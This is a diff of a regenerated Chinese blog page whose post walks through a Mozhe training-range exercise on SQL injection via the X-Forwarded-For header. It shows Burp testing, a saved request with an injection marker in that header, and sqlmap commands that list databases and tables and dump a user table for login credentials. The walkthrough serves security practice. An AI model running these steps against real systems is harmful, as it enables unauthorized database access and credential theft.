@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.2.1">
+<meta name="generator" content="Hexo 5.4.0">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/orange.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/orange.png">
@@ -64,7 +64,7 @@
 <meta property="og:url" content="https://dana5haw.com/posts/ZH-CN/mozhe-xff-inject.html">
 <meta property="og:site_name" content="Dana Shaw&#39;s blog">
 <meta property="og:description" content="前言练习X-Forwarded-For头注入，使用sqlmap进行注入。自己注册一个墨者账号，就可以练习里面的在线靶场。">
-<meta property="og:locale" content="ZH_CN">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://v2ray.dana5haw.com:8008/images/2020/04/12/image69150bf8bbef715b.png">
 <meta property="og:image" content="https://v2ray.dana5haw.com:8008/images/2020/04/12/imageb3812ab303598871.png">
 <meta property="og:image" content="https://v2ray.dana5haw.com:8008/images/2020/04/12/image8ebc890c12551e5d.png">
@@ -76,7 +76,7 @@
 <meta property="og:image" content="https://v2ray.dana5haw.com:8008/images/2020/04/12/image6a3e821399cdd099.png">
 <meta property="og:image" content="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagea5788d7df221f5a9.png">
 <meta property="article:published_time" content="2020-04-12T09:24:35.000Z">
-<meta property="article:modified_time" content="2020-06-27T14:12:28.867Z">
+<meta property="article:modified_time" content="2021-08-06T03:41:23.257Z">
 <meta property="article:author" content="Dana Shaw">
 <meta property="article:tag" content="墨者靶场练习">
 <meta property="article:tag" content="X-Forwarded-For头注入">
@@ -297,7 +297,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-06-27 22:12:28" itemprop="dateModified" datetime="2020-06-27T22:12:28+08:00">2020-06-27</time>
+                <time title="修改时间：2021-08-06 11:41:23" itemprop="dateModified" datetime="2021-08-06T11:41:23+08:00">2021-08-06</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -324,7 +324,7 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.5k</span>
+              <span>1.3k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -344,21 +344,20 @@
 
       
         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>练习X-Forwarded-For头注入，使用sqlmap进行注入。<br>自己注册一个墨者账号，就可以练习里面的在线靶场。</p>
-<a id="more"></a>
-
+<p><escape> <span id="more"></span></escape></p>
 <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote>
-<p>登录后台提示ip信息不正确，这种情况一般是x-forwarded-for读取客户端ip，通过在数据包添加x-forwarded-for:1.1.1.1看 respone包中是否存在1.1.1.1，如果存在则证明用x-forwarded-for读取客户端数据，则存在注入漏洞，通过在登录框数据包中添加x-forwarded-for:*，用sqlmap跑注入,跑数据库名，表名，字段名，字段内容，登录后台获取key值。<br>以上原理讲解<a href="https://www.mozhe.cn/bug/detail/QWxmdFFhVURDay90L0wxdmJXSkl5Zz09bW96aGUmozhe" target="_blank" rel="noopener">参考</a></p>
+<p>登录后台提示ip信息不正确，这种情况一般是x-forwarded-for读取客户端ip，通过在数据包添加x-forwarded-for:1.1.1.1看 respone包中是否存在1.1.1.1，如果存在则证明用x-forwarded-for读取客户端数据，则存在注入漏洞，通过在登录框数据包中添加x-forwarded-for:*，用sqlmap跑注入,跑数据库名，表名，字段名，字段内容，登录后台获取key值。<br>以上原理讲解<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/QWxmdFFhVURDay90L0wxdmJXSkl5Zz09bW96aGUmozhe">参考</a></p>
 </blockquote>
-<h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2><p>开启靶场：<a href="https://www.mozhe.cn/bug/detail/QWxmdFFhVURDay90L0wxdmJXSkl5Zz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/QWxmdFFhVURDay90L0wxdmJXSkl5Zz09bW96aGUmozhe</a><br><a href="https://v2ray.dana5haw.com:8008/image/1VVj" target="_blank" rel="noopener"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image69150bf8bbef715b.png" alt="image69150bf8bbef715b.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/1gAQ" target="_blank" rel="noopener"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imageb3812ab303598871.png" alt="imageb3812ab303598871.png"></a><br>使用burp抓包，获取登录请求。<br><a href="https://v2ray.dana5haw.com:8008/image/1xbu" target="_blank" rel="noopener"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image8ebc890c12551e5d.png" alt="image8ebc890c12551e5d.png"></a><br>添加X-Forwarded-For字段，设置为<code>127.0.0.1</code>进行测试：<br><a href="https://v2ray.dana5haw.com:8008/image/11Qc" target="_blank" rel="noopener"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagefe8b1b470c361a7b.png" alt="imagefe8b1b470c361a7b.png"></a><br>将X-Forwarded-For字段的值设置为<code>127.0.0.1&#39;</code>，进行测试：<br><a href="https://v2ray.dana5haw.com:8008/image/1Icd" target="_blank" rel="noopener"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagee5794c15c1063e4f.png" alt="imagee5794c15c1063e4f.png"></a><br>将X-Forwarded-For字段的值设置为<code>127.0.0.1*</code>，进行测试：<br><a href="https://v2ray.dana5haw.com:8008/image/1hKT" target="_blank" rel="noopener"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image58be178f383de0f5.png" alt="image58be178f383de0f5.png"></a><br>以上测试结果，说明存在X-Forwarded-For注入点。（<strong>为什么？</strong>）</p>
-<h2 id="使用sqlmap进行注入利用"><a href="#使用sqlmap进行注入利用" class="headerlink" title="使用sqlmap进行注入利用"></a>使用sqlmap进行注入利用</h2><p>将HTTP头存在txt文件，将txt放到sqlmap的根目录：<br><a href="https://v2ray.dana5haw.com:8008/image/1kBl" target="_blank" rel="noopener"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imageb50f992d557e6239.png" alt="imageb50f992d557e6239.png"></a><br>txt文件的内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 219.153.49.228:42875</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko&#x2F;20100101 Firefox&#x2F;75.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 27</span><br><span class="line">Origin: http:&#x2F;&#x2F;219.153.49.228:42875</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;219.153.49.228:42875&#x2F;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-For: 127.0.0.1*</span><br><span class="line"></span><br><span class="line">username&#x3D;admin&amp;password&#x3D;124</span><br></pre></td></tr></table></figure>
+<h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2><p>开启靶场：<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/QWxmdFFhVURDay90L0wxdmJXSkl5Zz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/QWxmdFFhVURDay90L0wxdmJXSkl5Zz09bW96aGUmozhe</a><br><a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/1VVj"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image69150bf8bbef715b.png" alt="image69150bf8bbef715b.png"></a><br><a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/1gAQ"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imageb3812ab303598871.png" alt="imageb3812ab303598871.png"></a><br>使用burp抓包，获取登录请求。<br><a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/1xbu"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image8ebc890c12551e5d.png" alt="image8ebc890c12551e5d.png"></a><br>添加X-Forwarded-For字段，设置为<code>127.0.0.1</code>进行测试：<br><a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/11Qc"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagefe8b1b470c361a7b.png" alt="imagefe8b1b470c361a7b.png"></a><br>将X-Forwarded-For字段的值设置为<code>127.0.0.1&#39;</code>，进行测试：<br><a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/1Icd"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagee5794c15c1063e4f.png" alt="imagee5794c15c1063e4f.png"></a><br>将X-Forwarded-For字段的值设置为<code>127.0.0.1*</code>，进行测试：<br><a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/1hKT"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image58be178f383de0f5.png" alt="image58be178f383de0f5.png"></a><br>以上测试结果，说明存在X-Forwarded-For注入点。（<strong>为什么？</strong>）</p>
+<h2 id="使用sqlmap进行注入利用"><a href="#使用sqlmap进行注入利用" class="headerlink" title="使用sqlmap进行注入利用"></a>使用sqlmap进行注入利用</h2><p>将HTTP头存在txt文件，将txt放到sqlmap的根目录：<br><a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/1kBl"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imageb50f992d557e6239.png" alt="imageb50f992d557e6239.png"></a><br>txt文件的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: 219.153.49.228:42875</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 27</span><br><span class="line">Origin: http://219.153.49.228:42875</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://219.153.49.228:42875/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-For: 127.0.0.1*</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=124</span><br></pre></td></tr></table></figure>
 <ul>
 <li>使用sqlmap，获取数据库名称：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt --dbs --batch</span><br></pre></td></tr></table></figure>
-<a href="https://v2ray.dana5haw.com:8008/image/1ohU" target="_blank" rel="noopener"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagef1058598a05de847.png" alt="imagef1058598a05de847.png"></a></li>
+<a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/1ohU"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagef1058598a05de847.png" alt="imagef1058598a05de847.png"></a></li>
 <li>获取数据库<code>webcalendar</code>的所有表名称：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt -D webcalendar --tables --batch</span><br></pre></td></tr></table></figure>
-<a href="https://v2ray.dana5haw.com:8008/image/13z8" target="_blank" rel="noopener"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image6a3e821399cdd099.png" alt="image6a3e821399cdd099.png"></a></li>
+<a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/13z8"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image6a3e821399cdd099.png" alt="image6a3e821399cdd099.png"></a></li>
 <li>获取表<code>user</code>的所有列数据<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt -D webcalendar -T user --dump --batch</span><br></pre></td></tr></table></figure>
-<a href="https://v2ray.dana5haw.com:8008/image/1NiZ" target="_blank" rel="noopener"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagea5788d7df221f5a9.png" alt="imagea5788d7df221f5a9.png"></a><br>最后使用表中的用户名密码登录系统就行了。<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>参考了这篇<a href="https://blog.csdn.net/SouthWind0/article/details/83348706" target="_blank" rel="noopener">文章</a></li>
+<a target="_blank" rel="noopener" href="https://v2ray.dana5haw.com:8008/image/1NiZ"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagea5788d7df221f5a9.png" alt="imagea5788d7df221f5a9.png"></a><br>最后使用表中的用户名密码登录系统就行了。<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>参考了这篇<a target="_blank" rel="noopener" href="https://blog.csdn.net/SouthWind0/article/details/83348706">文章</a></li>
 </ul>
 
     </div>
@@ -484,7 +483,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#判断注入点"><span class="nav-number">3.</span> <span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用sqlmap进行注入利用"><span class="nav-number">4.</span> <span class="nav-text">使用sqlmap进行注入利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">3.</span> <span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8sqlmap%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">使用sqlmap进行注入利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
       </div>
         <div id="">
 	  <canvas id="canvas" style="width:60%;">
@@ -598,12 +597,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">515k</span>
+    <span title="站点总字数">520k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">7:48</span>
+    <span title="站点阅读时长">7:53</span>
 </div>
 
         
